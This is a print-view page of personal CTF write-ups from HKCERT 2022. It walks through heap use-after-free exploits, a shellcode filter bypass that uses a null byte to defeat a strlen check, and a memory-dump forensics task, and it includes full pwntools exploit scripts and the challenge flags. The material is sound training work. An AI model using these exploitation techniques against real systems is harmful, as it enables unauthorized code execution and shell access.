<!DOCTYPE HTML>
<html lang="en" class="sidebar-visible no-js light">
    <head>
        <!-- Book generated using mdBook -->
        <meta charset="UTF-8">
        <title>CTF Write-ups</title>
                <meta name="robots" content="noindex" />
                

        <!-- Custom HTML head -->
        

        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
        <meta name="description" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="theme-color" content="#ffffff" />

                <link rel="icon" href="favicon.svg">
                        <link rel="shortcut icon" href="favicon.png">
                <link rel="stylesheet" href="css/variables.css">
        <link rel="stylesheet" href="css/general.css">
        <link rel="stylesheet" href="css/chrome.css">
                <link rel="stylesheet" href="css/print.css" media="print">
        
        <!-- Fonts -->
        <link rel="stylesheet" href="FontAwesome/css/font-awesome.css">
                <link rel="stylesheet" href="fonts/fonts.css">
        
        <!-- Highlight.js Stylesheets -->
        <link rel="stylesheet" href="highlight.css">
        <link rel="stylesheet" href="tomorrow-night.css">
        <link rel="stylesheet" href="ayu-highlight.css">

        <!-- Custom theme stylesheets -->
        
            </head>
    <body>
        <!-- Provide site root to javascript -->
        <script type="text/javascript">
            var path_to_root = "";
            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "light";
        </script>

        <!-- Work around some values being stored in localStorage wrapped in quotes -->
        <script type="text/javascript">
            try {
                var theme = localStorage.getItem('mdbook-theme');
                var sidebar = localStorage.getItem('mdbook-sidebar');

                if (theme.startsWith('"') && theme.endsWith('"')) {
                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
                }

                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
                }
            } catch (e) { }
        </script>

        <!-- Set the theme before any content is loaded, prevents flash -->
        <script type="text/javascript">
            var theme;
            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
            if (theme === null || theme === undefined) { theme = default_theme; }
            var html = document.querySelector('html');
            html.classList.remove('no-js')
            html.classList.remove('light')
            html.classList.add(theme);
            html.classList.add('js');
        </script>

        <!-- Hide / unhide sidebar before it is displayed -->
        <script type="text/javascript">
            var html = document.querySelector('html');
            var sidebar = 'hidden';
            if (document.body.clientWidth >= 1080) {
                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
                sidebar = sidebar || 'visible';
            }
            html.classList.remove('sidebar-visible');
            html.classList.add("sidebar-" + sidebar);
        </script>

        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
            <div class="sidebar-scrollbox">
                <ol class="chapter"><li class="chapter-item expanded affix "><a href="introducion.html">Introduction</a></li><li class="chapter-item expanded affix "><li class="part-title">HKCERT 2022</li><li class="chapter-item expanded "><a href="hkcert22/uaf.html"><strong aria-hidden="true">1.</strong> UAF</a></li><li class="chapter-item expanded "><a href="hkcert22/uaf2.html"><strong aria-hidden="true">2.</strong> UAF2</a></li><li class="chapter-item expanded "><a href="hkcert22/shellcode_runner_2.html"><strong aria-hidden="true">3.</strong> Shellcode Runner 2</a></li><li class="chapter-item expanded "><a href="hkcert22/clipboard.html"><strong aria-hidden="true">4.</strong> Clipboard</a></li><li class="chapter-item expanded "><a href="hkcert22/auction_with_blockchain.html"><strong aria-hidden="true">5.</strong> Auction with Blockchain</a></li></ol>            </div>
            <div id="sidebar-resize-handle" class="sidebar-resize-handle"></div>
        </nav>

        <div id="page-wrapper" class="page-wrapper">

            <div class="page">
                
                <div id="menu-bar-hover-placeholder"></div>
                <div id="menu-bar" class="menu-bar sticky bordered">
                    <div class="left-buttons">
                        <button id="sidebar-toggle" class="icon-button" type="button" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
                            <i class="fa fa-bars"></i>
                        </button>
                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
                            <i class="fa fa-paint-brush"></i>
                        </button>
                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
                            <li role="none"><button role="menuitem" class="theme" id="light">Light (default)</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
                        </ul>
                                                <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
                            <i class="fa fa-search"></i>
                        </button>
                                            </div>

                    <h1 class="menu-title">CTF Write-ups</h1>

                    <div class="right-buttons">
                                                <a href="print.html" title="Print this book" aria-label="Print this book">
                            <i id="print-button" class="fa fa-print"></i>
                        </a>
                                                                        
                    </div>
                </div>

                                <div id="search-wrapper" class="hidden">
                    <form id="searchbar-outer" class="searchbar-outer">
                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
                    </form>
                    <div id="searchresults-outer" class="searchresults-outer hidden">
                        <div id="searchresults-header" class="searchresults-header"></div>
                        <ul id="searchresults">
                        </ul>
                    </div>
                </div>
                
                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
                <script type="text/javascript">
                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
                    });
                </script>

                <div id="content" class="content">
                    <main>
                        <h1 id="introduction"><a class="header" href="#introduction">Introduction</a></h1>
<p>Hi! I am Jeff LIU. This is the write-ups of CTF challenges that I have completed.</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="uaf"><a class="header" href="#uaf">UAF</a></h1>
<h2 id="challenge-details"><a class="header" href="#challenge-details">Challenge details</a></h2>
<p><img src="hkcert22/assets/uaf_detail.png" alt="" /></p>
<h2 id="analysis"><a class="header" href="#analysis">Analysis</a></h2>
<p>This program has a <code>get_shell()</code> function. The target of this challenge is to execute this function.</p>
<pre><code class="language-c">void get_shell() {
    system(&quot;/bin/sh&quot;);
}
</code></pre>
<p>The <code>add_animal()</code> function will create 2 heap chunks and put in the list. </p>
<pre><code class="language-c">void add_animal() {
    int choice;
    int size;
    int idx;
    Animal* animal;

    if (zoo.numOfAnimal &gt;= ZOO_SIZE) {
        print(&quot;[ERROR] The zoo is full.&quot;);
        return;
    }

    for (idx = 0; idx &lt; ZOO_SIZE; idx++) {
        if (zoo.animals[idx] == NULL) {
            break;
        }
    }

    animal = (Animal*) malloc(sizeof(Animal));

    print(&quot;Type of animal?&quot;);
    print(&quot;1) Parrot&quot;);
    print(&quot;2) Panda&quot;);

    while (1) {
        printf(&quot;&gt; &quot;);
        scanf(&quot;%d&quot;, &amp;choice);
        if (choice == 1) {
            animal-&gt;type = PARROT;
            break;
        } 
        if (choice == 2) {
            animal-&gt;type = PANDA;
            break;
        }
        printf(&quot;??\n&quot;);
    }

    animal-&gt;speak = speak;
    print(&quot;How long is the name? (max: 64 characters)&quot;);   
    while (1) {
        printf(&quot;&gt; &quot;);
        scanf(&quot;%d&quot;, &amp;size);
        if (size &gt;= 0 &amp;&amp; size &lt; MAX_NAME_SIZE) {
            animal-&gt;name = (char*) malloc(size);
            break;
        } 
        printf(&quot;??\n&quot;);
    }

    print(&quot;Name of animal?&quot;);
    printf(&quot;&gt; &quot;);
    read(0, animal-&gt;name, size);

    zoo.animals[idx] = animal;
    printf(&quot;&gt; [DEBUG] Animal is added to zone %d\n&quot;, idx);
    zoo.numOfAnimal++;
}
</code></pre>
<p>The data structure is:</p>
<pre><code class="language-c">struct Animal
{
    speakFunc speak;
    enum AnimalType type;
    char* name;
};
</code></pre>
<p>You can see that there is a function pointer <code>speak</code> which will be called after <code>report_name()</code> function (<code>speak(name)</code>). Our target is overwrite <code>speak</code> with the address of <code>get_shell</code>.</p>
<pre><code class="language-c">void report_name() {
    &lt;SNIP&gt;
    zoo.animals[choice]-&gt;speak(zoo.animals[choice]-&gt;name);
}
</code></pre>
<p>Every time a new <code>Animal</code> is created, the pointer will will be inserted to <code>zoo[idx]</code> where <code>idx</code> is the first NULL pointer. Hence, use-after-free (UAF) can be applied. If we can overwrite the address of <code>speak</code> and call <code>report_name()</code>, <code>get_shell()</code> will be called.</p>
<pre><code class="language-c">void remove_animal() {
    int choice;

    &lt;SNIP&gt;

    free(zoo.animals[choice]-&gt;name);
    free(zoo.animals[choice]);

    printf(&quot;&gt; [DEBUG] Animal is removed from zone %d\n&quot;, choice);
    
    zoo.numOfAnimal--;
}
</code></pre>
<p>We want to make the <code>malloc()</code> allocate location to <code>name</code> that previous allocated to animal. Look at how GDB is executed.</p>
<p>Since the <code>add_animal()</code> request 2 heap chunks at once, the 2 chunks are allocated and freed in pairs.
<img src="hkcert22/assets/uaf_gdb1.png" alt="" /></p>
<p>As we can specify the size of the name, we can allocated name with size 0x40 (2 chunks <code>A</code>: 0x20,  <code>B</code>: 0x40), then create an animal with name chunk size 0x20 (2 chunks <code>C</code>: 0x20, <code>D</code>: 0x20). Thus, if these 2 chunks are freed and add a new animal with size 0x20, the chunks <code>A</code> and <code>C</code> will be allocated. If we the name to this animal, the address of <code>speak()</code> of the 2nd animal will be overwritten.
<img src="hkcert22/assets/uaf_gdb2.png" alt="" /></p>
<h2 id="solution"><a class="header" href="#solution">Solution</a></h2>
<pre><code class="language-python">from pwn import *
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']
context.arch = 'amd64'

e = ELF('./zoo')
# r = gdb.debug('./zoo', 'b* remove_animal\nc')
r = remote('chal.hkcert22.pwnable.hk', 28235)
def create(size, data):
    r.sendlineafter(b'Exit\n&gt; ', b'1')
    r.sendlineafter(b'2) Panda', b'1')
    r.sendlineafter(b'name? ', str(size).encode())
    r.sendafter(b'animal?', data)

def delete(id):
    r.sendlineafter(b'Exit\n&gt; ', b'2')
    r.sendlineafter(b'(0-9)', str(id).encode())

def report(id):
    r.sendlineafter(b'Exit\n&gt; ', b'3')
    r.sendlineafter(b'(0-9)', str(id).encode())
# 0
create(0x30, b'AAAAAAAAA')
# 1
create(0x18, b'AAAAAAAAA')
# 2
create(0x18, b'AAAAAAAAA')
# 3
create(0x18, b'AAAAAAAAA')
# 4
create(0x18, b'AAAAAAAAA')
# 5
create(0x18, b'AAAAAAAAA')
# 6
create(0x18, b'AAAAAAAAA')
# 7
create(0x18, b'AAAAAAAAA')


delete(1)
delete(0)

# 8
create(0x18, p64(e.symbols['get_shell']))
report(1)
r.interactive()
</code></pre>
<h2 id="flag"><a class="header" href="#flag">Flag</a></h2>
<p><code>hkcert22{w3L1C0me_70_World_0f_pwN_h34P_z0o}</code></p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="uaf2"><a class="header" href="#uaf2">UAF2</a></h1>
<h2 id="challenge-details-1"><a class="header" href="#challenge-details-1">Challenge Details</a></h2>
<p><img src="hkcert22/assets/uaf2_details.png" alt="" /></p>
<h2 id="analysis-1"><a class="header" href="#analysis-1">Analysis</a></h2>
<p>As the code of the challenge is similar to <a href="hkcert22/uaf.html">UAF</a> challenge, I used <code>diff</code> to find the difference to save some time.</p>
<p><img src="hkcert22/assets/uaf2_diff.png" alt="" /></p>
<p>You can see there are only two main differences:</p>
<ol>
<li>No <code>get_shell()</code> anymore but the <code>system()</code> is still used to find the current time. So, our goal this time is to modify the address of <code>speak()</code> to <code>system()</code> and the value of name to <code>/bin/sh</code></li>
<li>The size of the name is now fixed to <code>0x18</code>. Therefore, all the chunk size will be <code>0x20</code>, which means the attack used in <a href="hkcert22/uaf.html">UAF</a> cannot be applied again.</li>
</ol>
<p>But after looking into the binary, something abnormal appeared:
<img src="hkcert22/assets/uaf2_gdb.png" alt="" /></p>
<p>Notice the fastbin show that something is corrupted. Thus, I try testing the fastbin by filling up the <code>tcache</code> with animals (each tcache bin can hold 7 chunk at maximum, so 4 animals will create 8 chunk and one chunk should go to fastbin instead).
<img src="hkcert22/assets/uaf2_gdb.png" alt="" />
This time the chunk did not go to fastbin. If we allocate a new animal, the 2 chunks created are not connected anymore. Hence, there should be some combination that shifted the chunk and write to the destinated region.</p>
<p>After testing different combinations, I have come up the following solution.</p>
<h2 id="solution-1"><a class="header" href="#solution-1">Solution</a></h2>
<pre><code class="language-python">from pwn import *
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']
context.arch = 'amd64'

e = ELF('./zoo')
r = gdb.debug('./zoo', 'b* remove_animal\nc')
# r = remote('chal.hkcert22.pwnable.hk', 28236)
def create(data):
    r.sendlineafter(b'Exit\n&gt; ', b'1')
    r.sendlineafter(b'2) Panda', b'1')
    r.sendafter(b'animal?', data)

def delete(id):
    r.sendlineafter(b'Exit\n&gt; ', b'2')
    r.sendlineafter(b'(0-9)', str(id).encode())

def report(id):
    r.sendlineafter(b'Exit\n&gt; ', b'3')
    r.sendlineafter(b'(0-9)', str(id).encode())

# 0 - 3
for i in range(4):
    create(b'A' * 0x18)

# 0 - 3
for i in range(4):
    delete(3 - i)

# 4
create(p64(e.symbols['system']))

# 5 - 8
for i in range(4):
    create(b'A' * 0x18)
delete(8)
delete(7)
delete(5)
delete(6)

create(b'/bin/sh\0')
report(1)
r.interactive()
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="shellcode-runner-2"><a class="header" href="#shellcode-runner-2">Shellcode Runner 2</a></h1>
<h2 id="challenge-details-2"><a class="header" href="#challenge-details-2">Challenge Details</a></h2>
<p><img src="hkcert22/assets/shellcode_runner2_details.png" alt="" /></p>
<p>source:</p>
<pre><code class="language-c">#include &lt;unistd.h&gt;
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;sys/mman.h&gt;
#include &lt;ctype.h&gt;
#include &lt;string.h&gt;

typedef void (*void_fn)(void);

void _abort(char const * err_msg) {
    printf(&quot;%s&quot;, err_msg);
    exit(1);
}

void init() {
  setvbuf(stdin, 0, 2, 0);
  setvbuf(stdout, 0, 2, 0);
  setvbuf(stderr, 0, 2, 0);
  alarm(60);
}

int is_all_upper(char* s) {
    for (int i=0; i&lt;strlen(s); i++)
        if (!isupper(s[i]) &amp;&amp; !isdigit(s[i]) &amp;&amp; s[i] != ' ')
            return 0;
    return 1;
}

int main() {
    int SIZE = 100;
    int readed_len = 0;
    unsigned long rbx, rcx, rdx, rbp, rsp, rsi, rdi, r8, r9, r10, r11, r12, r13;
    char *shellcode;
    init();

    shellcode = (char*) mmap((void *)0x13370000, SIZE, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_ANONYMOUS|MAP_PRIVATE, -1, 0);

    if ((long)shellcode == -1)
        _abort(&quot;mmap failed!\n&quot;);
    memset(shellcode, '\0', SIZE);

    printf(&quot;\nInput your shellcode here (max: 100): &quot;);
    if ((readed_len = read(0, shellcode, SIZE - 1)) == 0)
        _abort(&quot;read failed!\n&quot;);
    
    if (shellcode[readed_len-1] == '\n') {
        shellcode[readed_len-1] = '\0';
    }
    
    if (is_all_upper(shellcode) == 0) {
        _abort(&quot;invalid shellcode!\n&quot;);
    }

    asm(
        &quot;movq %%rbx, %0;&quot;
        &quot;movq %%rcx, %1;&quot;
        &quot;movq %%rdx, %2;&quot;
        &quot;movq %%rbp, %3;&quot;
        &quot;movq %%rsp, %4;&quot;
        &quot;movq %%rsi, %5;&quot;
        &quot;movq %%rdi, %6;&quot;
        &quot;movq %%r8, %7;&quot;
        &quot;movq %%r9, %8;&quot;
        &quot;movq %%r10, %9;&quot;
        &quot;movq %%r11, %10;&quot;
        &quot;movq %%r12, %11;&quot;
        &quot;movq %%r13, %12;&quot;
        : &quot;=r&quot; (rbx), &quot;=r&quot; (rcx), &quot;=r&quot; (rdx), &quot;=r&quot; (rbp), &quot;=r&quot; (rsp), &quot;=r&quot; (rsi), &quot;=r&quot; (rdi), &quot;=r&quot; (r8), &quot;=r&quot; (r9), &quot;=r&quot; (r10), &quot;=r&quot; (r11), &quot;=r&quot; (r12), &quot;=r&quot; (r13): : &quot;memory&quot;
    );
    printf(&quot;Before running the shellcode:\nrax = %p\nrbx = 0x%lx\nrcx = 0x%lx\nrdx = 0x%lx\nrbp = 0x%lx\nrsp = 0x%lx\nrsi = 0x%lx\nrdi = 0x%lx\nr8 = 0x%lx\nr9 = 0x%lx\nr10 = 0x%lx\nr11 = 0x%lx\nr12 = 0x%lx\nr13 = 0x%lx\n&quot;,
        shellcode, rbx, rcx, rdx, rbp, rsp, rsi, rdi, r8, r9, r10, r11, r12, r13);
    asm(
        &quot;movq %0, %%rbx;&quot;
        &quot;movq %1, %%rcx;&quot;
        &quot;movq %2, %%rdx;&quot;
        &quot;movq %3, %%rbp;&quot;
        &quot;movq %4, %%rsp;&quot;
        &quot;movq %5, %%rsi;&quot;
        &quot;movq %6, %%rdi;&quot;
        &quot;movq %7, %%r8;&quot;
        &quot;movq %8, %%r9;&quot;
        &quot;movq %9, %%r10;&quot;
        &quot;movq %10, %%r11;&quot;
        &quot;movq %11, %%r12;&quot;
        &quot;movq %12, %%r13;&quot;
        :: &quot;m&quot;(rbx), &quot;m&quot;(rcx), &quot;m&quot;(rdx), &quot;m&quot;(rbp), &quot;m&quot;(rsp), &quot;m&quot;(rsi), &quot;m&quot;(rdi), &quot;m&quot; (r8), &quot;m&quot; (r9), &quot;m&quot; (r10), &quot;m&quot; (r11), &quot;m&quot; (r12), &quot;m&quot; (r13) 
    );
    ((void_fn) shellcode)();
}
</code></pre>
<h2 id="solution-2"><a class="header" href="#solution-2">Solution</a></h2>
<p>You can see the shellcode will be checked using the <code>is_all_upper()</code> function, which means that only upper case alphanumerical input is accpeted. </p>
<p>After searching on the Internet, I found several example of uppercase alphanumerical shellcodes. However, all of the suggested shellcodes are larger than 100 bytes. Hence, they cannot be used directly.</p>
<p>Later, I further investigated into the <code>is_all_upper()</code>. I found that the size of shellcode is checked using <code>strlen()</code>, which means that the checking will end if it sees the <code>0x00</code> characters. As <code>read</code> function does not stop at any null byte, I can include a null byte to stop the checking and append the normal shellcode at the end of the null byte.</p>
<p>Since I don't know whether <code>0x00</code> is a valid instruction, I searched online and found <a href="https://nets.ec/Alphanumeric_shellcode">this site</a>. It has an instruction <code>xor [dword], %eax</code> which is <code>'5'</code>. I think it can mov the value of the null byte into the eax. Also, to prevent bad instruction, I pad some <code>NOP</code> behind the null byte. And I successfully get the shell using this code:</p>
<pre><code class="language-python">from pwn import *
from pwnlib import encoders
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']
context.arch = 'amd64'

r = remote('chal.hkcert22.pwnable.hk', 28130)

r.recvuntil(b'(max: 100): ')
r.send(b'\x35\x00\x90\x90\x90' + asm(shellcraft.sh()))
r.interactive()
</code></pre>
<h2 id="flag-1"><a class="header" href="#flag-1">Flag</a></h2>
<p><code>hkcert22{d41d8cd98f00b204e9800998ecf8427e33a}</code></p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="clipboard"><a class="header" href="#clipboard">Clipboard</a></h1>
<h2 id="challenge-details-3"><a class="header" href="#challenge-details-3">Challenge Details</a></h2>
<p><img src="hkcert22/assets/clipboard_detail.png" alt="" /></p>
<h2 id="solution-3"><a class="header" href="#solution-3">Solution</a></h2>
<p>The zip file contains a <code>Windows 7 x64.mem</code> file. I guessed this file is the memory dump of a Windows 7 machine. As the title and description of the challenge implies that the secret is inside the clipboard of the machine, we need to peek into the data of clipboard using <code>Volatility</code>.</p>
<p>The file name implies that it is a Windows 7 x64 machine. Thus, I used the <code>Win7SP1x64</code> profile:</p>
<pre><code class="language-bash">python2 vol.py -f Windows\ 7\ x64.mem --profile=Win7SP1x64 clipboard -v
</code></pre>
<p>The output is the following:</p>
<pre><code>&lt;SNIP&gt;
         1 ------------- ------------------            0x7010d 0xfffff900c3600000                                                   
0xfffff900c3600014  7b 5c 72 74 66 31 5c 61 6e 73 69 5c 61 6e 73 69   {\rtf1\ansi\ansi
0xfffff900c3600024  63 70 67 31 32 35 32 5c 64 65 66 66 30 5c 64 65   cpg1252\deff0\de
0xfffff900c3600034  66 6c 61 6e 67 31 30 33 33 7b 5c 66 6f 6e 74 74   flang1033{\fontt
0xfffff900c3600044  62 6c 7b 5c 66 30 5c 66 6e 69 6c 5c 66 63 68 61   bl{\f0\fnil\fcha
0xfffff900c3600054  72 73 65 74 30 20 43 61 6c 69 62 72 69 3b 7d 7d   rset0.Calibri;}}
0xfffff900c3600064  0d 0a 7b 5c 2a 5c 67 65 6e 65 72 61 74 6f 72 20   ..{\*\generator.
0xfffff900c3600074  4d 73 66 74 65 64 69 74 20 35 2e 34 31 2e 32 31   Msftedit.5.41.21
0xfffff900c3600084  2e 32 35 31 30 3b 7d 5c 76 69 65 77 6b 69 6e 64   .2510;}\viewkind
0xfffff900c3600094  34 5c 75 63 31 5c 70 61 72 64 5c 73 61 32 30 30   4\uc1\pard\sa200
0xfffff900c36000a4  5c 73 6c 32 34 30 5c 73 6c 6d 75 6c 74 31 5c 6c   \sl240\slmult1\l
0xfffff900c36000b4  61 6e 67 39 5c 66 30 5c 66 73 32 32 7b 5c 70 69   ang9\f0\fs22{\pi
0xfffff900c36000c4  63 74 5c 77 6d 65 74 61 66 69 6c 65 38 5c 70 69   ct\wmetafile8\pi
0xfffff900c36000d4  63 77 31 30 35 38 33 5c 70 69 63 68 31 30 35 38   cw10583\pich1058
0xfffff900c36000e4  33 5c 70 69 63 77 67 6f 61 6c 36 30 30 30 5c 70   3\picwgoal6000\p
0xfffff900c36000f4  69 63 68 67 6f 61 6c 36 30 30 30 20 0d 0a 30 31   ichgoal6000...01
0xfffff900c3600104  30 30 30 39 30 30 30 30 30 33 32 32 62 39 30 35   000900000322b905
0xfffff900c3600114  30 30 30 30 30 30 66 39 62 38 30 35 30 30 30 30   000000f9b8050000
0xfffff900c3600124  30 30 30 34 30 30 30 30 30 30 30 33 30 31 30 38   0004000000030108
0xfffff900c3600134  30 30 30 35 30 30 30 30 30 30 30 62 30 32 30 30   00050000000b0200
0xfffff900c3600144  30 30 30 30 30 30 30 35 30 30 30 30 0d 0a 30 30   000000050000..00
0xfffff900c3600154  30 63 30 32 66 34 30 31 66 34 30 31 30 33 30 30   0c02f401f4010300
0xfffff900c3600164  30 30 30 30 31 65 30 30 30 34 30 30 30 30 30 30   00001e0004000000
0xfffff900c3600174  30 37 30 31 30 34 30 30 30 34 30 30 30 30 30 30   0701040004000000
&lt;SNIP&gt;
</code></pre>
<p>The starting part of this memory shows that it is an RTF file. Therefore, we need to find a way to dump this file. I used a python script to write the bytes to a file.</p>
<pre><code class="language-python">file_string = &quot;&quot;

with open('result_copy', 'r') as f:
    lines = f.readlines()
    count = 1
    for line in lines:
        s = ''
        line = line[19:67]
        for i in range(16):
            try:
                s += chr(int(line[i * 3 : (i + 1) * 3], 16))
            except ValueError:
                pass
        file_string += s
        count += 1
print(file_string)
with open('result.rtf', 'w') as f:
    f.write(file_string)
</code></pre>
<p>Now open this file in Microsoft Word. The file contains an image with flag. Goal!
<img src="hkcert22/assets/clipboard_rtf.png" alt="" /></p>
<h2 id="flag-2"><a class="header" href="#flag-2">Flag</a></h2>
<pre><code>hkcert22{f0r3ns1c_1s_fun_t0_p14y_w1th}
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="auction-with-blockchain"><a class="header" href="#auction-with-blockchain">Auction with Blockchain</a></h1>
<h1 id="challenge-details-4"><a class="header" href="#challenge-details-4">Challenge Details</a></h1>

                    </main>

                    <nav class="nav-wrapper" aria-label="Page navigation">
                        <!-- Mobile navigation buttons -->
                        
                        
                        <div style="clear: both"></div>
                    </nav>
                </div>
            </div>

            <nav class="nav-wide-wrapper" aria-label="Page navigation">
                
                            </nav>

        </div>

        
        
        
                <script type="text/javascript">
            window.playground_copyable = true;
        </script>
        
        
                <script src="elasticlunr.min.js" type="text/javascript" charset="utf-8"></script>
        <script src="mark.min.js" type="text/javascript" charset="utf-8"></script>
        <script src="searcher.js" type="text/javascript" charset="utf-8"></script>
        
        <script src="clipboard.min.js" type="text/javascript" charset="utf-8"></script>
        <script src="highlight.js" type="text/javascript" charset="utf-8"></script>
        <script src="book.js" type="text/javascript" charset="utf-8"></script>

        <!-- Custom JS scripts -->
        
                        <script type="text/javascript">
        window.addEventListener('load', function() {
            window.setTimeout(window.print, 100);
        });
        </script>
                
    </body>
</html>
